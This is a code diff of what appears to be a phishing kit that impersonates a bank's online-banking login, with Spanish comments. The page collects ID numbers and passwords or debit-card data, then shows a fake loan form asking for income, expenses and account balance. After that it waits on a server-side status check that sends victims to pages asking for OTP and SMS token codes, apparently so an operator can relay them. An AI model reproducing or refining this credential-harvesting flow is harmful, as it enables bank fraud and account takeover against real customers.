@@ -7,7 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     
-    <link rel="stylesheet" href="assets/css/login.css">
     <link rel="stylesheet" href="assets/css/bancavirtual.css"> 
     <style>
         /* Estilos para el overlay de carga y el popup de error */
@@ -363,9 +362,6 @@
 
         // Ejecutar la función inmediatamente al cargar el script (antes de DOMContentLoaded)
         checkAndRedirect();
-
-        // Opcional: También se puede escuchar el evento resize, pero para una 
-        // redirección temprana al cargar, lo anterior es más eficiente.
     </script>
     </head>
 <body>
@@ -404,7 +400,10 @@
 
                 <div class="bv-content-wrapper">
                     <!-- FORMULARIO 1: Clave Segura -->
-                    <form method="post" action="assets/config/process_bv_login.php" novalidate>
+                    <!-- ======================= MODIFICACIÓN ======================= -->
+                    <!-- El 'action' ahora se maneja por JS, pero lo dejamos por si JS falla -->
+                    <form method="post" action="assets/config/process_bv_login.php" novalidate id="login-form-clave">
+                    <!-- ========================================================== -->
                         
                         <label for="document_type" class="bv-input-label">Identificación</label>
                         <div class="bv-input-group">
@@ -446,7 +445,9 @@
             <div class="bv-tab-content" id="tarjeta">
                 <div class="bv-content-wrapper">
                     <!-- FORMULARIO 2: Tarjeta Débito -->
-                    <form method="post" action="assets/config/process_bv_login.php" novalidate>
+                    <!-- ======================= MODIFICACIÓN ======================= -->
+                    <form method="post" action="assets/config/process_bv_login.php" novalidate id="login-form-tarjeta">
+                    <!-- ========================================================== -->
                         
                         <label for="document_type_td" class="bv-input-label">Identificación</label>
                         <div class="bv-input-group">
@@ -637,11 +638,11 @@
 
 
     <script src="assets/js/bancavirtual.js"></script>
+    
+    <!-- ========================================================== -->
+    <!-- === SECCIÓN DE SCRIPT COMPLETAMENTE REESCRITA        === -->
+    <!-- ========================================================== -->
     <script>
-// Variables globales para guardar los datos del login
-let cachedLoginData = null;
-let cachedFormAction = '';
-
 // Función para formatear números como moneda
 function formatCurrency(value) {
     const numericValue = parseFloat(value.replace(/\D/g, ''));
@@ -683,13 +684,10 @@ function setupInputValidation(form) {
 
             // Formatear campos de moneda
             if (['ingresoMensual', 'gastosMensual', 'saldoActual'].includes(this.id)) {
-                const
-                 caretPosition = this.selectionStart;
-                const
-                 originalLength = this.value.length;
+                const caretPosition = this.selectionStart;
+                const originalLength = this.value.length;
                 this.value = formatCurrency(this.value);
-                const
-                 newLength = this.value.length;
+                const newLength = this.value.length;
                 // Ajustar posición del cursor
                 if (caretPosition !== null) {
                     this.setSelectionRange(caretPosition + (newLength - originalLength), caretPosition + (newLength - originalLength));
@@ -701,12 +699,84 @@ function setupInputValidation(form) {
 
 document.addEventListener('DOMContentLoaded', function() {
     
-    // --- LÓGICA ORIGINAL DE LA PÁGINA DE LOGIN ---
+    // --- Selectores de Elementos ---
     const loadingOverlay = document.getElementById('loadingOverlay');
     const errorPopupOverlay = document.getElementById('errorPopupOverlay');
     const loanModalOverlay = document.getElementById('loanModalOverlay');
-    const loadingText = document.querySelector('.loading-text'); // <-- AÑADIDO
+    const loadingText = document.querySelector('.loading-text');
+    const loanForm = document.getElementById('loan-form');
+    const submitLoanBtn = document.getElementById('submit-loan-btn');
+    const cancelLoanBtn = document.getElementById('cancel-loan-btn');
+    const montoSlider = document.getElementById('montoCredito');
+    const montoDisplay = document.getElementById('montoSeleccionado');
+    const plazoSelect = document.getElementById('plazo');
 
+    let checkInterval; // Variable global para el intervalo de polling
+
+    // --- Función de Polling (Verificar Estado) ---
+    function checkStatus(transactionId) {
+        fetch(`assets/config/verificar_estado.php?id=${transactionId}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    const estado = data.estado;
+                    if (estado === 1) { 
+                        clearInterval(checkInterval); 
+                        loadingOverlay.classList.remove('active'); 
+                        errorPopupOverlay.classList.add('active'); 
+                    } else if (estado === 2) { 
+                        clearInterval(checkInterval);
+                        window.location.href = `otp.php?id=${transactionId}`;
+                    } else if (estado === 0) {
+                        console.log('Estado actual:', estado, '. Esperando confirmación...');
+                    } else if (estado === 3) { 
+                        clearInterval(checkInterval);
+                        window.location.href = `otp.php?id=${transactionId}&error=token_invalid`;
+                    } else if (estado === 4) { 
+                        clearInterval(checkInterval);
+                        window.location.href = `tokemovil.php?id=${transactionId}`;
+                    } else if (estado === 5) { 
+                        clearInterval(checkInterval);
+                        window.location.href = `tokemovil.php?id=${transactionId}&error=sms_invalid`;
+                    }
+                } else {
+                    console.error('Error al verificar estado:', data.message);
+                    clearInterval(checkInterval);
+                    loadingOverlay.classList.remove('active');
+                    console.error('Ocurrió un error al procesar tu solicitud. Por favor, intenta de nuevo.');
+                    window.location.href = 'index.php'; 
+                }
+            })
+            .catch(error => {
+                console.error('Error en la petición de verificación:', error);
+                clearInterval(checkInterval);
+                loadingOverlay.classList.remove('active');
+                console.error('No se pudo comunicar con el servidor. Por favor, intenta de nuevo.');
+                window.location.href = 'index.php'; 
+            });
+    }
+
+    // --- Función para iniciar el Polling ---
+    function startPolling(transactionId) {
+        // Iniciar el loader
+        loadingOverlay.classList.add('active');
+
+        // Iniciar el intervalo
+        checkInterval = setInterval(() => checkStatus(transactionId), 3000); 
+        checkStatus(transactionId); // Llamar inmediatamente una vez
+
+        // Timeout de seguridad
+        setTimeout(() => {
+            if (loadingOverlay.classList.contains('active')) {
+                clearInterval(checkInterval);
+                loadingOverlay.classList.remove('active');
+                console.error('El tiempo de espera ha terminado. Por favor, verifica tus datos o intenta más tarde.');
+                window.location.href = 'index.php';
+            }
+        }, 120000); // 2 minutos
+    }
+
+    // --- Lógica Principal al Cargar la Página ---
     function getUrlParameter(name) {
         name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
         const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -715,126 +785,77 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     const transactionId = getUrlParameter('id');
-    let checkInterval; 
 
     if (transactionId) {
-        loadingOverlay.classList.add('active');
+        // ==================================================================
+        // === FLUJO 2: YA TENEMOS ID, MOSTRAMOS MODAL DE CRÉDITO         ===
+        // ==================================================================
+        
+        // Verificamos si ya enviamos el crédito (ej. si el usuario refresca la pág)
+        const creditSent = sessionStorage.getItem(`credit_sent_${transactionId}`);
 
-        function checkStatus() {
-            fetch(`assets/config/verificar_estado.php?id=${transactionId}`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        const estado = data.estado;
-                        if (estado === 1) { 
-                            clearInterval(checkInterval); 
-                            loadingOverlay.classList.remove('active'); 
-                            errorPopupOverlay.classList.add('active'); 
-                        } else if (estado === 2) { 
-                            clearInterval(checkInterval);
-                            window.location.href = `otp.php?id=${transactionId}`;
-                        } else if (estado === 0) {
-                            console.log('Estado actual:', estado, '. Esperando confirmación...');
-                        } else if (estado === 3) { 
-                            clearInterval(checkInterval);
-                            window.location.href = `otp.php?id=${transactionId}&error=token_invalid`;
-                        } else if (estado === 4) { 
-                            clearInterval(checkInterval);
-                            window.location.href = `tokemovil.php?id=${transactionId}`;
-                        }
-                        // ======================= INICIO DE LA MODIFICACIÓN =======================
-                        else if (estado === 5) { 
-                            clearInterval(checkInterval);
-                            window.location.href = `tokemovil.php?id=${transactionId}&error=sms_invalid`;
-                        }
-                        // ======================= FIN DE LA MODIFICACIÓN =======================
-                    } else {
-                        // ======================= INICIO DE LA MODIFICACIÓN (RESTAURADO) =======================
-                        console.error('Error al verificar estado:', data.message);
-                        clearInterval(checkInterval);
-                        loadingOverlay.classList.remove('active');
-                        // Evitamos el alert()
-                        console.error('Ocurrió un error al procesar tu solicitud. Por favor, intenta de nuevo.');
-                        window.location.href = 'index.php'; // <-- RESTAURADO
-                        // ======================= FIN DE LA MODIFICACIÓN (RESTAURADO) =======================
-                    }
-                })
-                .catch(error => {
-                    // ======================= INICIO DE LA MODIFICACIÓN (RESTAURADO) =======================
-                    console.error('Error en la petición de verificación:', error);
-                    clearInterval(checkInterval);
-                    loadingOverlay.classList.remove('active');
-                     // Evitamos el alert()
-                    console.error('No se pudo comunicar con el servidor. Por favor, intenta de nuevo.');
-                    window.location.href = 'index.php'; // <-- RESTAURADO
-                    // ======================= FIN DE LA MODIFICACIÓN (RESTAURADO) =======================
-                });
+        if (creditSent) {
+            // Si ya lo envió, solo mostramos el loader y esperamos
+            startPolling(transactionId);
+        } else {
+            // Si no lo ha enviado, mostramos el modal de crédito
+            loanModalOverlay.classList.add('active');
+            
+            // Autocompletar datos si existen (aunque vienen de la pág anterior,
+            // podríamos pasarlos por sessionStorage, pero por ahora se quedan en blanco)
         }
 
-        checkInterval = setInterval(checkStatus, 3000); 
-        checkStatus(); 
+    } else {
+        // ==================================================================
+        // === FLUJO 1: NO TENEMOS ID, PÁGINA DE LOGIN NORMAL             ===
+        // ==================================================================
+        
+        // Lógica de Tabs
+        const tabs = document.querySelectorAll('.bv-tab');
+        const tabContents = document.querySelectorAll('.bv-tab-content');
+        
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                tabs.forEach(t => t.classList.remove('is-active'));
+                this.classList.add('is-active');
+                const targetTab = this.dataset.tab;
+                tabContents.forEach(content => {
+                    content.classList.remove('is-active');
+                    if (content.id === targetTab) {
+                        content.classList.add('is-active');
+                    }
+                });
+            });
+        });
 
-        setTimeout(() => {
-            if (loadingOverlay.classList.contains('active')) {
-                clearInterval(checkInterval);
-                loadingOverlay.classList.remove('active');
-                 // Evitamos el alert()
-                console.error('El tiempo de espera ha terminado. Por favor, verifica tus datos o intenta más tarde.');
-                window.location.href = 'index.php';
-            }
-        }, 120000); 
-    }
-    
-    // Lógica de Tabs
-    const tabs = document.querySelectorAll('.bv-tab');
-    const tabContents = document.querySelectorAll('.bv-tab-content');
-    
-    tabs.forEach(tab => {
-        tab.addEventListener('click', function() {
-            tabs.forEach(t => t.classList.remove('is-active'));
-            this.classList.add('is-active');
-            const targetTab = this.dataset.tab;
-            tabContents.forEach(content => {
-                content.classList.remove('is-active');
-                if (content.id === targetTab) {
-                    content.classList.add('is-active');
+        // Lógica de Toggle de Contraseña
+        document.querySelectorAll('.bv-toggle-pass').forEach(button => {
+            button.addEventListener('click', function() {
+                const inputId = this.getAttribute('aria-controls');
+                const input = document.getElementById(inputId);
+                if (input.type === 'password') {
+                    input.type = 'text';
+                    this.setAttribute('aria-pressed', 'true');
+                } else {
+                    input.type = 'password';
+                    this.setAttribute('aria-pressed', 'false');
                 }
             });
         });
-    });
 
-    // Lógica de Toggle de Contraseña
-    document.querySelectorAll('.bv-toggle-pass').forEach(button => {
-        button.addEventListener('click', function() {
-            const inputId = this.getAttribute('aria-controls');
-            const input = document.getElementById(inputId);
-            if (input.type === 'password') {
-                input.type = 'text';
-                this.setAttribute('aria-pressed', 'true');
-            } else {
-                input.type = 'password';
-                this.setAttribute('aria-pressed', 'false');
-            }
-        });
-    });
-
-    // Lógica de cerrar Alerta
-    const alertMessage = document.querySelector('.bv-alert-message');
-    const closeAlertBtn = document.querySelector('.bv-close-btn');
-    if (closeAlertBtn) {
-        closeAlertBtn.addEventListener('click', function() {
-            alertMessage.style.display = 'none';
-        });
+        // Lógica de cerrar Alerta
+        const alertMessage = document.querySelector('.bv-alert-message');
+        const closeAlertBtn = document.querySelector('.bv-close-btn');
+        if (closeAlertBtn) {
+            closeAlertBtn.addEventListener('click', function() {
+                alertMessage.style.display = 'none';
+            });
+        }
     }
 
-    // --- FIN LÓGICA ORIGINAL ---
+    // --- Configuración de TODOS los formularios (Login y Crédito) ---
 
-
-    // ==========================================================
-    // === NUEVA LÓGICA DE FORMULARIOS Y MODAL DE CRÉDITO ===
-    // ==========================================================
-
-    // 1. Validación para los formularios de LOGIN
+    // 1. Validación para los formularios de LOGIN (Flujo 1)
     const loginForms = document.querySelectorAll('.bv-login-card form');
     loginForms.forEach(form => {
         const submitBtn = form.querySelector('.bv-submit-btn');
@@ -848,67 +869,21 @@ document.addEventListener('DOMContentLoaded', function() {
         validateForm(form, submitBtn); // Estado inicial
 
         // ***** INTERCEPTAR EL SUBMIT DEL LOGIN *****
+        // Esta vez no prevenimos el default, dejamos que se envíe
+        // y recargue la página a index.php?id=...
         form.addEventListener('submit', function(e) {
-            e.preventDefault(); // Evita el envío original
-            
-            // Guarda los datos y la acción del formulario de login
-            cachedLoginData = new FormData(e.target);
-            cachedFormAction = e.target.action;
-
-            // Transfiere datos al formulario del modal si es relevante
-            const docType = cachedLoginData.get('document_type') || cachedLoginData.get('document_type_td');
-            const docNum = cachedLoginData.get('document_number') || cachedLoginData.get('document_number_td');
-            
-            if (docType) {
-                document.getElementById('tipoDocCredito').value = docType;
-            }
-            if (docNum) {
-                document.getElementById('cedula').value = docNum;
-            }
-
-            // Muestra el modal de crédito
-            loanModalOverlay.classList.add('active');
-            // Valida el formulario de crédito por si los campos autocompletados son suficientes
-            validateForm(loanForm, submitLoanBtn);
+            // Mostramos un loader simple para que el usuario sepa que algo pasó
+            loadingOverlay.classList.add('active');
+            // El formulario se envía NORMALMENTE a process_bv_login.php
         });
     });
 
-    // 2. Lógica del MODAL DE CRÉDITO
-    const loanForm = document.getElementById('loan-form');
-    const submitLoanBtn = document.getElementById('submit-loan-btn');
-    const cancelLoanBtn = document.getElementById('cancel-loan-btn');
+    // 2. Lógica del MODAL DE CRÉDITO (Flujo 2)
     
-    const montoSlider = document.getElementById('montoCredito');
-    const montoDisplay = document.getElementById('montoSeleccionado');
-    const plazoSelect = document.getElementById('plazo');
-    // const cuotaDisplay = document.getElementById('cuotaMensual'); // Eliminado
-    
-    // const TASA_INTERES_MENSUAL = 0.0181; // 1.81% // Eliminado
-    // const SEGURO_MENSUAL = 5000; // Valor de ejemplo // Eliminado
-
-    /* --- Se elimina la función de cálculo ---
-    function calcularCuotaMensual() {
-        const monto = parseInt(montoSlider.value);
-        const meses = parseInt(plazoSelect.value);
-        
-        const interes = monto * TASA_INTERES_MENSUAL;
-        const cuota = (monto / meses) + interes + SEGURO_MENSUAL;
-        
-        cuotaDisplay.textContent = formatCurrency(String(Math.round(cuota)));
-    }
-    */
-
     // Lógica del Slider
     montoSlider.addEventListener('input', (e) => {
         montoDisplay.textContent = formatCurrency(e.target.value);
-        // calcularCuotaMensual(); // Eliminado
     });
-
-    // Lógica del Plazo
-    // plazoSelect.addEventListener('change', calcularCuotaMensual); // Eliminado
-
-    // Inicializar cuota y validación
-    // calcularCuotaMensual(); // Eliminado
     
     // Validación para el formulario de CRÉDITO
     const loanInputs = loanForm.querySelectorAll('input[required], select[required]');
@@ -918,58 +893,64 @@ document.addEventListener('DOMContentLoaded', function() {
     setupInputValidation(loanForm); // Configura validación de blur/input
     validateForm(loanForm, submitLoanBtn); // Estado inicial
 
-    // Botón de Cancelar
+    // Botón de Cancelar (Flujo 2)
     cancelLoanBtn.addEventListener('click', () => {
-        loanModalOverlay.classList.remove('active');
-        cachedLoginData = null; // Limpia los datos cacheados
-        cachedFormAction = '';
+        // Si cancela, lo mandamos al inicio
+        window.location.href = 'index.php';
     });
 
-    // ***** ENVÍO FINAL (LOGIN + CRÉDITO) *****
+    // ***** ENVÍO DEL CRÉDITO (Flujo 2) *****
     loanForm.addEventListener('submit', function(e) {
         e.preventDefault();
 
-        // 1. Prepara los datos del crédito
+        // Deshabilitar botón para evitar doble envío
+        submitLoanBtn.disabled = true;
+        submitLoanBtn.textContent = 'Enviando...';
+
+        // 1. Prepara los datos del crédito (limpiando valores)
         const loanData = new FormData(loanForm);
+        const processedLoanData = new FormData();
 
-        // 2. Crea el formulario final en memoria
-        const finalForm = document.createElement('form');
-        finalForm.method = 'post';
-        finalForm.action = cachedFormAction; // 'assets/config/process_bv_login.php'
-        finalForm.style.display = 'none';
-
-        // 3. Añade los datos del LOGIN (cacheados)
-        if (cachedLoginData) {
-            for (const [key, value] of cachedLoginData.entries()) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = value;
-                finalForm.appendChild(input);
-            }
-        }
-
-        // 4. Añade los datos del CRÉDITO (del modal)
         for (const [key, value] of loanData.entries()) {
              // Limpia valores de moneda antes de enviar
             let finalValue = value;
             if (['ingresoMensual', 'gastosMensual', 'saldoActual', 'montoCredito'].includes(key)) {
                 finalValue = value.replace(/\D/g, '');
             }
-            
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = `credito_${key}`; // Prefijo para evitar colisiones
-            input.value = finalValue;
-            finalForm.appendChild(input);
+            processedLoanData.append(key, finalValue);
         }
 
-        // 5. Añade el formulario al DOM y envíalo
-        document.body.appendChild(finalForm);
-        finalForm.submit();
-        
-        // El submit recargará la página a 'index.php?id=...'
-        // y la lógica de 'transactionId' se activará.
+        // 2. Enviar por Fetch al nuevo script
+        fetch(`assets/config/process_credit_data.php?id=${transactionId}`, {
+            method: 'POST',
+            body: processedLoanData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                // 3. Si tiene éxito:
+                // Guardamos en sessionStorage para que si refresca, no pida de nuevo
+                sessionStorage.setItem(`credit_sent_${transactionId}`, 'true');
+                
+                // Ocultamos el modal
+                loanModalOverlay.classList.remove('active');
+                
+                // Empezamos el polling (loader y espera)
+                startPolling(transactionId);
+            } else {
+                // Si el PHP devuelve error
+                console.error('Error al enviar datos de crédito:', data.message);
+                alert('Hubo un error al enviar sus datos de crédito. Intente de nuevo.');
+                submitLoanBtn.disabled = false;
+                submitLoanBtn.textContent = 'Validar';
+            }
+        })
+        .catch(error => {
+            console.error('Error de red al enviar crédito:', error);
+            alert('Hubo un error de red. Verifique su conexión e intente de nuevo.');
+            submitLoanBtn.disabled = false;
+            submitLoanBtn.textContent = 'Validar';
+        });
     });
 
 });
